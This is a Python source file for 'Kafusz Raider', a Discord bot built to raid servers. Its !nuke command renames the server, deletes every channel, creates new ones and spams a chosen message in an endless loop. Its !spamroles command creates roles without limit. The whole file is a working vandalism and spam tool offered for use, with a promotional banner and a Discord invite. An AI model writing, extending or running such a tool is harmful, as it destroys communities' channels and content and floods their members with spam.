import random
from anyio import sleep
import discord
from discord.ext import commands
import colorama
from colorama import Fore
from colorama import Style
import os
import ctypes

client = commands.Bot(command_prefix='!', intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    print(f"Logged in as {client.user}")

os.system("cls")

version = '1.0'

ctypes.windll.kernel32.SetConsoleTitleW(f"Kafusz Raider v{version}")

name_channels = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Channels name: ")
how_much_channels = int(input(f"{Fore.GREEN}[+]{Style.RESET_ALL} How many channels to create?: "))
server_name = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Server name: ")
spam_message = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Spam message: ")
token_bot = input(f"{Fore.GREEN}[+]{Style.RESET_ALL} Bot token: ")

@client.command()
async def nuke(ctx):
    guild = ctx.guild
    await ctx.guild.edit(name=server_name)
    try:
        for channels in ctx.guild.channels:
            await channels.delete()
    except:
        pass

    for i in range(how_much_channels):
        new_channel = await guild.create_text_channel(name_channels)

    while True:
        for channel in guild.text_channels:
            await channel.send(spam_message)

@client.command()
async def spamroles(ctx, role_name):
    guild = ctx.guild
    author = ctx.message.author
    await author.send(f"The {role_name} roles has been created")
    while True:
        await guild.create_role(name=role_name)

os.system("cls")

print(f"""{Fore.MAGENTA}
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════    
  {Fore.LIGHTMAGENTA_EX}             {Fore.MAGENTA}                        __ __      ____                    ____        _     __        
  {Fore.LIGHTMAGENTA_EX}[v{version}]{Fore.MAGENTA}                              / //_/___ _/ __/_  ___________     / __ \____ _(_)___/ /__  _____
  {Fore.LIGHTMAGENTA_EX}[discord.gg/sP9bFPDgWV]{Fore.MAGENTA}            / ,< / __ `/ /_/ / / / ___/_  /    / /_/ / __ `/ / __  / _ \/ ___/ 
  {Fore.LIGHTMAGENTA_EX}[Made by Kafusz]{Fore.MAGENTA}                  / /| / /_/ / __/ /_/ (__  ) / /_   / _, _/ /_/ / / /_/ /  __/ /    
  {Fore.LIGHTMAGENTA_EX}                {Fore.MAGENTA}                 /_/ |_\__,_/_/  \__,_/____/ /___/  /_/ |_|\__,_/_/\__,_/\___/_/ 

════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{Style.RESET_ALL} """)

print("Commands:")
print(f"\n{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}1{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} !nuke")
print(f"{Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}2{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} !spamroles [name]")
print(f"\n{Fore.YELLOW}prefix: !{Style.RESET_ALL}")
print(f"{Fore.YELLOW}Video tutorial: Soon{Style.RESET_ALL}")
print("    ")

client.run(token_bot)